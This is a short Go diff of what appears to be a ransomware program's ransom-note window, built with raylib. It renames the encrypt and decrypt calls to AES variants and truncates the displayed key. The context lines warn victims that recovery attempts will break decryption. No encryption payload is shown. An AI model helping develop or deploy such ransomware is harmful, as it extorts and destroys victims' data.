@@ -28,7 +28,7 @@ func main() {
 			fmt.Println("Error creating marker:", err)
 			return
 		}
-		akey, err = encrypt()
+		akey, err = encryptAES()
 		if err != nil {
 			panic(err)
 		}
@@ -65,7 +65,7 @@ func main() {
 		rl.DrawText("the cipher and decryption will be impossible.", 40, 385, 20, rl.DarkGray)
 		rl.DrawText("2. Trying to recover with any software can also break the cipher", 25, 415, 20, rl.DarkGray)
 		rl.DrawText("and file recovery will become a problem.", 40, 445, 20, rl.DarkGray)
-		rl.DrawText("key: "+string(akey), 40, 485, 20, rl.DarkGray)
+		rl.DrawText("key: "+string(akey)[:13]+"...", 40, 485, 20, rl.DarkGray)
 
 		if gui.Button(rl.Rectangle{X: 280, Y: 485, Width: 25, Height: 25}, gui.IconText(gui.ICON_FILE_COPY, "")) {
 			clipboard.Write(clipboard.FmtText, akey)
@@ -84,7 +84,7 @@ func main() {
 
 		gui.SetStyle(gui.BUTTON, gui.TEXT_ALIGNMENT, gui.TEXT_ALIGN_CENTER)
 		if gui.Button(rl.Rectangle{X: 370, Y: 525, Width: 150, Height: 40}, gui.IconText(gui.ICON_KEY, "Decrypt")) {
-			if err := decrypt(textBoxText); err != nil {
+			if err := decryptAES(textBoxText); err != nil {
 				showFailMessageBox = true
 			} else {
 				showSuccessMessageBox = true
